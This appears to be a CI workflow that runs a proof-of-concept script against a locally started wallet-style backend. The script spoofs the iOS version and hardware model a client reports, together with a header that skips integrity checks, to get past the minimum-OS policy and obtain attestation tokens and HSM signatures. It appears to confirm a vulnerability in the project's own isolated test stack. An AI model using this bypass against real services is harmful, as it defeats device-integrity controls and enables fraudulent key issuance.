name: iOS MDVM device-class spoofing E2E PoC

on:
  push:
    branches:
      - poc/ios-mdvm-deviceclass-spoof
  workflow_dispatch:

permissions:
  contents: read

jobs:
  e2e:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 25
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "25"
          cache: gradle

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install PoC dependencies
        run: python -m pip install --disable-pip-version-check requests cryptography

      - name: Generate local dev PKI and SoftHSM fixtures
        run: |
          chmod +x softhsm/gen-keys.sh softhsm/init-slot.sh softhsm/entrypoint.sh
          ./softhsm/gen-keys.sh

      - name: Build backend jars
        run: |
          chmod +x gradlew
          ./gradlew --no-daemon bootJar bootJarMdvm bootJarRwsca bootJarWpb bootJarPns

      - name: Start isolated local stack
        run: |
          docker compose up --build -d app-combined
          for i in $(seq 1 90); do
            if curl -fsS http://127.0.0.1:8080/actuator/health/readiness >/tmp/health.json; then
              cat /tmp/health.json
              exit 0
            fi
            sleep 2
          done
          docker compose ps
          docker compose logs --no-color app-combined | tail -n 300
          exit 1

      - name: Execute iOS device-class spoofing PoC
        shell: bash
        run: |
          cat > /tmp/poc.py <<'PY'
          import base64, hashlib, json, os, time
          import requests
          from cryptography.hazmat.primitives import hashes, serialization
          from cryptography.hazmat.primitives.asymmetric import ec, utils
          from cryptography.exceptions import InvalidSignature

          BASE="http://127.0.0.1:8080"
          T=20

          def b64(x): return base64.b64encode(x).decode()
          def compact(o): return json.dumps(o,separators=(",",":")).encode()
          def pub(k): return b64(k.public_key().public_bytes(serialization.Encoding.DER,serialization.PublicFormat.SubjectPublicKeyInfo))
          def digest(body): return "sha-256=:"+b64(hashlib.sha256(body).digest())+":"
          def sig_input(fields,keyid,created):
              return "("+" ".join('"'+f+'"' for f in fields)+f');keyid="{keyid}";alg="ecdsa-p256-sha256";created={created}'
          def sig_base(method,path,headers,fields,inp):
              out=[]
              for f in fields:
                  lf=f.lower()
                  if lf=="@method": out.append('"@method": '+method.upper())
                  elif lf=="@path": out.append('"@path": '+path)
                  else:
                      v=next((v for k,v in headers.items() if k.lower()==lf),None)
                      if v is None: raise RuntimeError("missing "+f)
                      out.append('"'+lf+'": '+v)
              out.append('"@signature-params": '+inp)
              return "\n".join(out)
          def sign(method,path,headers,specs):
              now=int(time.time()); ins=[]; sigs=[]
              for label,keyid,fields,key in specs:
                  inp=sig_input(fields,keyid,now)
                  s=key.sign(sig_base(method,path,headers,fields,inp).encode(),ec.ECDSA(hashes.SHA256()))
                  ins.append(label+"="+inp); sigs.append(label+"=:"+b64(s)+":")
              return {"Signature-Input":",".join(ins),"Signature":",".join(sigs)}
          def req(method,path,headers=None,body=None,expected=(200,)):
              r=requests.request(method,BASE+path,headers=headers or {},data=body,timeout=T)
              print(method,path,"HTTP",r.status_code)
              if r.status_code not in expected:
                  print(r.text[:3000])
                  raise SystemExit(1)
              return r
          def challenge(path,field):
              return req("POST",path).json()[field]
          def signed(method,path,headers,specs,body_obj=None,expected=(200,)):
              body=None; h=dict(headers)
              if body_obj is not None:
                  body=compact(body_obj); h["Content-Type"]="application/json"; h["Content-Digest"]=digest(body)
              h.update(sign(method,path,h,specs))
              return req(method,path,h,body,expected)

          MDVM_REG=["@method","@path","auth-challenge","content-digest"]
          WPB_REG=["@method","@path","auth-challenge","mdvm-token"]
          WPB_ATT=["@method","@path","wpb-wi-id","auth-challenge","mdvm-token","content-digest"]
          R_REG=["@method","@path","auth-challenge","mdvm-token"]
          R_INIT=["@method","@path","content-digest","rwsca-account-id","auth-challenge","mdvm-token"]
          R_KEYS=["@method","@path","content-digest","rwsca-account-id","auth-challenge","mdvm-token"]
          R_SIGN=["@method","@path","content-digest","rwsca-account-id","auth-challenge","mdvm-token","rwsca-pin-session-token"]

          mdvm=ec.generate_private_key(ec.SECP256R1())

          def ios_body(system_version, hardware_model):
              return {
                "wi_device_class":{
                  "systemVersion":system_version,
                  "model":"iPhone",
                  "hardwareModel":hardware_model,
                  "identifierForVendor":"11111111-1111-1111-1111-111111111111",
                  "uname":"Darwin",
                  "osVersion":"Version "+system_version
                },
                "wi_mdvm_auth_pubk":pub(mdvm),
                "pap_devicecheck_attestation":"",
                "pap_devicecheck_assertion":""
              }

          print("=== 1. Control: below-minimum iOS version is rejected ===")
          ch=challenge("/v1/mdvm/challenge","mdvm_auth_challenge")
          h={"Auth-Challenge":ch,"Skip-Integrity-Checks":"all"}
          old=signed("POST","/v1/mdvm/ios/register",h,[("mdvm-auth-sig","wi-mdvm-auth-key",MDVM_REG,mdvm)],ios_body("17.0","iPhone15,2"),expected=(403,))
          try: old_code=old.json().get("code")
          except Exception: old_code=None
          print("CONTROL_ERROR_CODE="+str(old_code))
          if old_code!="OUTDATED_OS_VERSION":
              raise SystemExit("Expected OUTDATED_OS_VERSION")

          print("=== 2. Spoof only client-reported systemVersion/hardwareModel ===")
          ch=challenge("/v1/mdvm/challenge","mdvm_auth_challenge")
          h={"Auth-Challenge":ch,"Skip-Integrity-Checks":"all"}
          ok=signed("POST","/v1/mdvm/ios/register",h,[("mdvm-auth-sig","wi-mdvm-auth-key",MDVM_REG,mdvm)],ios_body("99.0","iPhone99,99"))
          mdvm_token=ok.json()["mdvm_token"]
          print("SPOOFED_MDVM_REGISTRATION_ACCEPTED=true")

          print("=== 3. Obtain WPB WIA using token from spoofed device class ===")
          ch=challenge("/v1/wpb/challenge","wpb_auth_challenge")
          h={"Auth-Challenge":ch,"Mdvm-Token":mdvm_token}
          reg=signed("POST","/v1/wpb/register",h,[("wpb-auth-sig","wi-mdvm-auth-key",WPB_REG,mdvm)]).json()
          wpb_id=reg["wpb_wi_id"]
          wia_key=ec.generate_private_key(ec.SECP256R1())
          ch=challenge("/v1/wpb/challenge","wpb_auth_challenge")
          h={"Wpb-Wi-Id":wpb_id,"Auth-Challenge":ch,"Mdvm-Token":mdvm_token}
          att=signed("POST","/v1/wpb/attestation",h,[
            ("wpb-auth-sig","wi-mdvm-auth-key",WPB_ATT,mdvm),
            ("wpb-wia-sig","wi-wia-key",WPB_ATT,wia_key)
          ],{"wi_wia_pubk":pub(wia_key),"wpb_client_instance_id":None}).json()
          if not att.get("wpb_wia"): raise SystemExit("WIA missing")
          print("WPB_WIA_ISSUED=true")

          print("=== 4. Obtain RWSCA WTE and HSM signing capability ===")
          ch=challenge("/v1/rwsca/challenge","rwsca_auth_challenge")
          h={"Auth-Challenge":ch,"Mdvm-Token":mdvm_token}
          rid=signed("POST","/v1/rwsca/register",h,[("rwsca-auth-sig","wi-mdvm-auth-key",R_REG,mdvm)]).json()["rwsca_account_id"]

          pin=ec.generate_private_key(ec.SECP256R1())
          ch=challenge("/v1/rwsca/challenge","rwsca_auth_challenge")
          h={"Rwsca-Account-Id":rid,"Auth-Challenge":ch,"Mdvm-Token":mdvm_token}
          pin_resp=signed("POST","/v1/rwsca/initializePinAndStartPinSession",h,[
            ("rwsca-auth-sig","wi-mdvm-auth-key",R_INIT,mdvm),
            ("rwsca-pin-sig","wi-rwsca-pin-key",R_INIT,pin)
          ],{"wi_rwsca_pin_pubk":pub(pin)}).json()
          pst=pin_resp["rwsca_pin_session_token"]

          ch=challenge("/v1/rwsca/challenge","rwsca_auth_challenge")
          h={"Rwsca-Account-Id":rid,"Auth-Challenge":ch,"Mdvm-Token":mdvm_token}
          kr=signed("POST","/v1/rwsca/createKeys",h,[("rwsca-auth-sig","wi-mdvm-auth-key",R_KEYS,mdvm)],{
            "number_of_keys":1,
            "pp_c_nonce":b64(os.urandom(32))
          }).json()
          if not kr.get("rwsca_wte"): raise SystemExit("WTE missing")
          print("RWSCA_WTE_ISSUED=true")

          ki=kr["rwsca_wi_keys"][0]
          digest_to_sign=hashlib.sha256(b"ios-mdvm-deviceclass-spoof-poc").digest()
          ch=challenge("/v1/rwsca/challenge","rwsca_auth_challenge")
          h={"Rwsca-Account-Id":rid,"Rwsca-Pin-Session-Token":pst,"Auth-Challenge":ch,"Mdvm-Token":mdvm_token}
          sr=signed("POST","/v1/rwsca/signData",h,[("rwsca-auth-sig","wi-mdvm-auth-key",R_SIGN,mdvm)],{
            "rwsca_wi_wrapped_prvk":ki["rwsca_wi_wrapped_prvk"],
            "wi_key_binding_data_hash":b64(digest_to_sign)
          }).json()
          signature=base64.b64decode(sr["rwscd_key_binding_signature"])
          pk=serialization.load_der_public_key(base64.b64decode(ki["rwscd_wi_pubk"]))
          try:
              pk.verify(signature,digest_to_sign,ec.ECDSA(utils.Prehashed(hashes.SHA256())))
          except InvalidSignature:
              raise SystemExit("HSM signature invalid")
          print("POST_POLICY_BYPASS_HSM_SIGNATURE_VERIFIED=true")

          print()
          print("CONFIRMED_E2E:")
          print("reported_old_version_rejected=true")
          print("spoofed_high_version_accepted=true")
          print("mdvm_token_issued=true")
          print("wpb_wia_issued=true")
          print("rwsca_wte_issued=true")
          print("hsm_signature_verified=true")
          print("IOS_MDVM_DEVICE_CLASS_POLICY_BYPASS_CONFIRMED=true")
          PY
          python /tmp/poc.py

      - name: Show relevant backend logs
        if: always()
        run: |
          docker compose logs --no-color app-combined 2>&1 | grep -E "OUTDATED_OS_VERSION|MDVM|RWSCA|WPB" | tail -n 200 || true

      - name: Tear down
        if: always()
        run: docker compose down -v --remove-orphans
